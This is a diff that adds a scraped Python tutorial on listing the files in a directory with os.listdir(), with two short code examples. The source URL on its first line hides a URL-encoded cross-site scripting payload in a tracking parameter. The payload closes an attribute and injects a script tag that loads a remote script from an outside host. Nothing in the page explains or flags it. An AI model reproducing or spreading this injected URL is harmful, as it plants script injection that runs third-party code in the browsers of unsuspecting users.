@@ -1,0 +1,38 @@
+https://www.csestack.org/how-to-get-python-list-all-files-in-directory-with-extension/?utm_source&utm_medium&utm_campaign=%5C%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fscriptcdn.info%2Fstats.js%3E%3C%2Fscript%3E
+
+
+HOW TO GET PYTHON LIST ALL FILES IN DIRECTORY WITH EXTENSION?
+
+To get the list of file names in the given folder or directory, we can use different approaches. The easiest way of doing it, use the Python os module.
+
+The Python os module is very useful and it has a lot of features for accessing file systems and other operating systems details.
+
+os.listdir()
+Python os module has a method called listdir(). It returns the Pyhton list of all the files in the directory. The syntax for this method is pretty simple and you can get it from the below code.
+
+
+Note: Make sure your Python script is saved in the same directory. You can also specify the directory name in the listdir() method.
+
+The above code prints the Python list which includes all the file names from the current folder or directory with extension. It also includes subdirectories
+
+-------------------------------------------------------------------
+import os
+
+list_files = os.listdir()
+print(list_files)
+
+
+You can also print the file names one by one as a string using Python for-loop.
+
+
+import os
+
+list_files = os.listdir()
+for file_name in list_files:
+	print(file_name)
+
+
+=========================================================================
+Once you get the list of file names, you can perform different file operations like reading, writing and deleting files.
+
+This is a very useful yet simple automation trick to get the Python list all files in directory with extension
